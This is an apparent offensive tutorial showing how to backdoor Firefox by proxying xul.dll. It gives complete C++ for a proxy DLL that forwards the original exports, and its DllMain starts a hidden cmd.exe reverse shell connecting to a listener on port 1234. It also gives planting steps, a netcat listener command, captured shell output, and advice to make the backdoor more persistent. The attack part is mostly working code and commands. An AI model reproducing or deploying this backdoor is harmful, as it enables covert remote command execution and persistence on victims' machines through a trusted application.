# DLL Proxy

This technique allows the creation of a proxy DLL and forwarding the original needed function from an application to the original DLL while attempting to 
run malicious code from the DLL built for proxying.
The idea was taken from https://github.com/leetCipher/Malware.development/tree/main/dll-proxying 

Create a fake DLL for intercepting function calls from an application.
Steps for reproducing. In this demo, I'll try to backdoor `Firefox`

- Open a new Visual Studio Project -> DLL Type
- Copy the DDL that will be attacked in the same root directory of the `Visual Studio Code` Project.
In the case of Firefox, I'll copy `xul.dll` (remember to delete `xul.dll.sig` in the same place)
- Rename the copied dll to another name, from `xul.dll` example `assets.dll`
- Run the script `dll_export.py` providing the DLL we're attacking. This can take a while for a big application like `Firefox`
- Copy and paste `dllmain.cpp` content in the cpp file of the project and paste the obtained output from `dll_export.py`
You should obtain something like this:

```cpp
#include "pch.h"
#include <Windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>

#define WIN32_LEAN_AND_MEAN
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#pragma comment(lib, "Ws2_32.lib")

#pragma comment(linker, "/export:?SetRemoteExceptionHandler@CrashReporter@@YA_NPEBDV?$Maybe@K@mozilla@@@Z=assets.?SetRemoteExceptionHandler@CrashReporter@@YA_NPEBDV?$Maybe@K@mozilla@@@Z")
#pragma comment(linker, "/export:DumpCompleteHeap=assets.DumpCompleteHeap")
#pragma comment(linker, "/export:DumpJSStack=assets.DumpJSStack")
#pragma comment(linker, "/export:GIFFT_LabeledTimingDistributionAccumulateRawMillis=assets.GIFFT_LabeledTimingDistributionAccumulateRawMillis")
#pragma comment(linker, "/export:GIFFT_LabeledTimingDistributionCancel=assets.GIFFT_LabeledTimingDistributionCancel")
#pragma comment(linker, "/export:GIFFT_LabeledTimingDistributionStart=assets.GIFFT_LabeledTimingDistributionStart")
#pragma comment(linker, "/export:GIFFT_LabeledTimingDistributionStopAndAccumulate=assets.GIFFT_LabeledTimingDistributionStopAndAccumulate")
#pragma comment(linker, "/export:GIFFT_TimingDistributionAccumulateRawSample=assets.GIFFT_TimingDistributionAccumulateRawSample")
#pragma comment(linker, "/export:GIFFT_TimingDistributionAccumulateRawSamples=assets.GIFFT_TimingDistributionAccumulateRawSamples")
#pragma comment(linker, "/export:GIFFT_TimingDistributionCancel=assets.GIFFT_TimingDistributionCancel")
#pragma comment(linker, "/export:GIFFT_TimingDistributionStart=assets.GIFFT_TimingDistributionStart")
#pragma comment(linker, "/export:GIFFT_TimingDistributionStopAndAccumulate=assets.GIFFT_TimingDistributionStopAndAccumulate")
#pragma comment(linker, "/export:JOG_MaybeReload=assets.JOG_MaybeReload")
#pragma comment(linker, "/export:JOG_RegisterMetric=assets.JOG_RegisterMetric")
#pragma comment(linker, "/export:JOG_RegisterPing=assets.JOG_RegisterPing")
#pragma comment(linker, "/export:VR_RuntimePath=assets.VR_RuntimePath")
#pragma comment(linker, "/export:XRE_GetBootstrap=assets.XRE_GetBootstrap")
#pragma comment(linker, "/export:gWinEventLogSourceName=assets.gWinEventLogSourceName")
#pragma comment(linker, "/export:mozilla_dump_image=assets.mozilla_dump_image")
#pragma comment(linker, "/export:mozilla_net_is_label_safe=assets.mozilla_net_is_label_safe")
#pragma comment(linker, "/export:uprofiler_backtrace_into_buffer=assets.uprofiler_backtrace_into_buffer")
#pragma comment(linker, "/export:uprofiler_feature_active=assets.uprofiler_feature_active")
#pragma comment(linker, "/export:uprofiler_get=assets.uprofiler_get")
#pragma comment(linker, "/export:uprofiler_is_active=assets.uprofiler_is_active")
#pragma comment(linker, "/export:uprofiler_native_backtrace=assets.uprofiler_native_backtrace")
#pragma comment(linker, "/export:uprofiler_register_thread=assets.uprofiler_register_thread")
#pragma comment(linker, "/export:uprofiler_simple_event_marker=assets.uprofiler_simple_event_marker")
#pragma comment(linker, "/export:uprofiler_simple_event_marker_capture_stack=assets.uprofiler_simple_event_marker_capture_stack")
#pragma comment(linker, "/export:uprofiler_simple_event_marker_with_stack=assets.uprofiler_simple_event_marker_with_stack")
#pragma comment(linker, "/export:uprofiler_unregister_thread=assets.uprofiler_unregister_thread")

// Structure to pass to threads
typedef struct {
    SOCKET sock;
    HANDLE hRead;
    HANDLE hWrite;
} ThreadParams;

// Thread to forward data from socket to process input
DWORD WINAPI SocketToInputThread(LPVOID lpParam) {
    ThreadParams* params = (ThreadParams*)lpParam;
    char buffer[4096];
    DWORD bytesRead, bytesWritten;

    while (1) {
        // Receive data from socket
        int result = recv(params->sock, buffer, sizeof(buffer), 0);
        if (result <= 0) break;  // Connection closed or error

        // Write to process input
        if (!WriteFile(params->hWrite, buffer, result, &bytesWritten, NULL) || bytesWritten == 0) {
            break;
        }
    }

    return 0;
}

// Thread to forward data from process output to socket
DWORD WINAPI OutputToSocketThread(LPVOID lpParam) {
    ThreadParams* params = (ThreadParams*)lpParam;
    char buffer[4096];
    DWORD bytesRead;

    while (1) {
        // Read from process output
        if (!ReadFile(params->hRead, buffer, sizeof(buffer), &bytesRead, NULL) || bytesRead == 0) {
            break;
        }

        // Send data to socket
        if (send(params->sock, buffer, bytesRead, 0) <= 0) {
            break;
        }
    }

    return 0;
}

// Main shell thread
DWORD WINAPI ShellThread(LPVOID lpParameter) {
    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;
    struct sockaddr_in serverAddr;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    SECURITY_ATTRIBUTES sa;

    HANDLE hChildStdinRd = NULL, hChildStdinWr = NULL;
    HANDLE hChildStdoutRd = NULL, hChildStdoutWr = NULL;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    // Prepare server address
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(1234);
    inet_pton(AF_INET, "127.0.0.1", &serverAddr.sin_addr);

    // Connect to listener
    if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr))) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Create pipes for child process
    sa.nLength = sizeof(sa);
        sa.lpSecurityDescriptor = NULL;
        sa.bInheritHandle = TRUE;

        // Create pipe for child's stdin (input to the child)
        if (!CreatePipe(&hChildStdinRd, &hChildStdinWr, &sa, 0)) {
            closesocket(sock);
            WSACleanup();
            return 1;
        }

    // Create pipe for child's stdout (output from the child)
    if (!CreatePipe(&hChildStdoutRd, &hChildStdoutWr, &sa, 0)) {
        CloseHandle(hChildStdinRd);
        CloseHandle(hChildStdinWr);
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Set up process startup info
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = hChildStdinRd;
    si.hStdOutput = hChildStdoutWr;
    si.hStdError = hChildStdoutWr;

    // Launch hidden cmd.exe
    char cmd[] = "cmd.exe";
    ZeroMemory(&pi, sizeof(pi));
    if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hChildStdinRd);
        CloseHandle(hChildStdinWr);
        CloseHandle(hChildStdoutRd);
        CloseHandle(hChildStdoutWr);
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Close pipe ends that the child process uses
    CloseHandle(hChildStdinRd);   // Child uses this for stdin
    CloseHandle(hChildStdoutWr);  // Child uses this for stdout

    // Prepare parameters for threads
    ThreadParams inputParams = { sock, NULL, hChildStdinWr };
    ThreadParams outputParams = { sock, hChildStdoutRd, NULL };

    // Create threads for I/O forwarding
    HANDLE hThreads[2];
    hThreads[0] = CreateThread(NULL, 0, SocketToInputThread, &inputParams, 0, NULL);
    hThreads[1] = CreateThread(NULL, 0, OutputToSocketThread, &outputParams, 0, NULL);

    // Wait for the process to exit
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Cleanup
    TerminateProcess(pi.hProcess, 0);

    // Close remaining handles
    CloseHandle(hChildStdinWr);
    CloseHandle(hChildStdoutRd);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    // Close socket and cleanup Winsock
    closesocket(sock);
    WSACleanup();

    // Wait for I/O threads to finish
    WaitForMultipleObjects(2, hThreads, TRUE, 2000);
    CloseHandle(hThreads[0]);
    CloseHandle(hThreads[1]);

    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, 0, ShellThread, NULL, 0, NULL);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

- Build the DLL by pressing `F7` and you should find the compiled DLL in the `x64/Debug` folder
- Rename the built dll with the original and legit dll name in this case: `xul.dll`
- Now copy both `assets.dll` and `xul.dll` back to the original Firefox folder.
- Run `nc -lvnp 1234`
- Everytime `Firefox` is opened:

```powershell
C:\Program Files\Mozilla Firefox>echo %USERNAME%
echo %USERNAME%
virgula
```

> [!TIP]
> 
> Remember that the connection works only until `Firefox` will keep running, but the process can be migrated and the backdoor code should and must be updated to something more stable.